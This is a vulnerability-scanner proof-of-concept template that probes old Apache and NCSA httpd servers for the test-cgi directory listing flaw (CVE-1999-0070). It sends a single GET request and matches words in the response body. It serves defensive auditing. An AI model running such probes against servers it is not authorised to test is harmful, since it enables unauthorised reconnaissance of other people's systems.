[info]
author = "ave"
description = "验证目标 Apache 0.8.x/1.0.x 或 NCSA httpd 1.x 服务器是否存在 test-cgi 目录泄露漏洞，通过向 /cgi-bin/test-cgi 发送 HTTP GET 请求，检测响应中是否包含目录列表信息"
id = "POC-AVE-1999-0175"
name = "Apache NCSA HTTPd test-cgi Directory Listing PoC"
severity = "medium"
tags = ["ave-1999-0175"]
vuln_id = [
    "CVE-1999-0070",
    "AVE-1999-0175",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/test-cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "test-cgi",
    "Directory",
    "<title>",
]
